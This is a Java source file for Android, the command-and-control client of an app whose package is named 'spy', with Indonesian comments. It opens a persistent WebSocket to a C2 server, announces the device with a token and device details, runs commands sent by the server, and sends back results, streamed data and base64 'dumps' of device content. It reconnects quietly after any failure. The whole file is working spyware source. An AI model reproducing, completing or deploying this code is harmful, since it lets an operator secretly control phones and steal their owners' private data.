package ai.m4zk1play.spy;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

/** Klien WebSocket ke server C2. */
public class C2Client {

    public interface Sink {
        void onCommand(String id, String type, JSONObject args);
        void onReady();
        void onDown();
    }

    private static final String TAG = "MZK";
    private final OkHttpClient http;
    private final Handler ui = new Handler(Looper.getMainLooper());
    private final Sink sink;
    private final Keys keys;
    private WebSocket ws;
    private volatile boolean stop;

    public C2Client(Keys keys, Sink sink) {
        this.keys = keys;
        this.sink = sink;
        this.http = new OkHttpClient.Builder()
                .pingInterval(25, TimeUnit.SECONDS)
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .build();
    }

    public void connect() {
        stop = false;
        Request req = new Request.Builder().url(keys.wsUrl()).build();
        ws = http.newWebSocket(req, new WebSocketListener() {
            @Override public void onOpen(WebSocket s, Response r) {
                try {
                    JSONObject hello = new JSONObject();
                    hello.put("t", "hello");
                    hello.put("token", keys.token);
                    hello.put("info", Device.info(s.getRequest().url().toString()));
                    s.send(hello.toString());
                    ui.post(sink::onReady);
                } catch (Exception e) {
                    Log.w(TAG, "hello gagal", e);
                }
            }

            @Override public void onMessage(WebSocket s, String text) {
                try {
                    JSONObject o = new JSONObject(text);
                    if ("cmd".equals(o.optString("t"))) {
                        sink.onCommand(o.optString("id"), o.optString("type"),
                                o.optJSONObject("args") == null ? new JSONObject() : o.optJSONObject("args"));
                    }
                } catch (Exception e) {
                    Log.w(TAG, "pesan rusak", e);
                }
            }

            @Override public void onFailure(WebSocket s, Throwable t, Response r) {
                ui.post(sink::onDown);
                retry();
            }

            @Override public void onClosed(WebSocket s, int code, String reason) {
                ui.post(sink::onDown);
                retry();
            }
        });
    }

    private void retry() {
        if (stop) return;
        ui.postDelayed(this::connect, 6000);
    }

    public boolean send(String json) {
        WebSocket s = ws;
        return s != null && s.send(json);
    }

    public void result(String id, boolean ok, JSONObject data) {
        try {
            JSONObject o = new JSONObject();
            o.put("t", "result");
            o.put("id", id);
            o.put("ok", ok);
            o.put("data", data == null ? new JSONObject() : data);
            send(o.toString());
        } catch (Exception ignored) {
        }
    }

    public void stream(String kind, String b64, JSONObject meta) {
        try {
            JSONObject o = new JSONObject();
            o.put("t", "stream");
            o.put("kind", kind);
            o.put("b64", b64);
            if (meta != null) o.put("meta", meta);
            send(o.toString());
        } catch (Exception ignored) {
        }
    }

    public void dump(String kind, String name, String b64) {
        try {
            JSONObject o = new JSONObject();
            o.put("t", "dump");
            o.put("kind", kind);
            o.put("name", name);
            o.put("b64", b64);
            send(o.toString());
        } catch (Exception ignored) {
        }
    }

    public void stop() {
        stop = true;
        if (ws != null) ws.close(1000, "bye");
    }
}
